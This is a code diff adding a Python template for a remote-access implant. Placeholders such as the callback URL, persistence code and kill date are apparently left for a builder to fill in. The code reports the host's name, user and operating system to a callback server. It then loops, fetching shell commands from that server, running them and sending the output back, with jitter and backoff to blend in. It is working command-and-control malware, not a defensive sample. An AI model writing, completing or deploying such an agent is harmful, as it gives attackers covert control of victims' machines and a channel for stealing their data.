@@ -1,0 +1,37 @@
+import socket,os,json,time,subprocess,platform,random
+from urllib.request import Request,urlopen,ProxyHandler,build_opener,install_opener
+from urllib.error import URLError,HTTPError
+
+CB="[CALLBACK]"
+FREQ=[FREQ]
+JITTER=[JITTER]
+RETRY_MAX=[RETRY_MAX]
+LABEL="[LABEL]"
+[PROXY_SETUP]
+def post(url,data,ct="application/json"):
+    r=Request(url,data=data.encode() if isinstance(data,str) else data,headers={"Content-Type":ct},method="POST")
+    return urlopen(r)
+
+def get(url):
+    return urlopen(Request(url))
+
+h=socket.gethostname()
+u=os.getenv("USER") or os.getenv("USERNAME") or "unknown"
+o=f"{platform.system()} {platform.release()} {platform.machine()}"
+resp=json.loads(post(f"{CB}/agent/checkin",json.dumps({"hostname":h,"username":u,"os_info":o,"script":LABEL})).read())
+aid=resp["agent_id"]
+[PERSIST_CODE]
+_backoff=1
+while True:
+    [KILLDATE_CHECK]
+    try:
+        r=get(f"{CB}/agent/cmd/{aid}")
+        if r.status==200:
+            _backoff=1
+            d=json.loads(r.read())
+            out=subprocess.run(d["command"],shell=True,capture_output=True,text=True,timeout=300)
+            post(f"{CB}/agent/res/{d['id']}",out.stdout+out.stderr,"text/plain")
+    except (HTTPError,URLError,Exception):
+        if RETRY_MAX>1 and _backoff<RETRY_MAX:_backoff+=1
+    s=FREQ*_backoff
+    time.sleep(s*(1+random.uniform(-JITTER/100,JITTER/100)) if JITTER>0 else s)
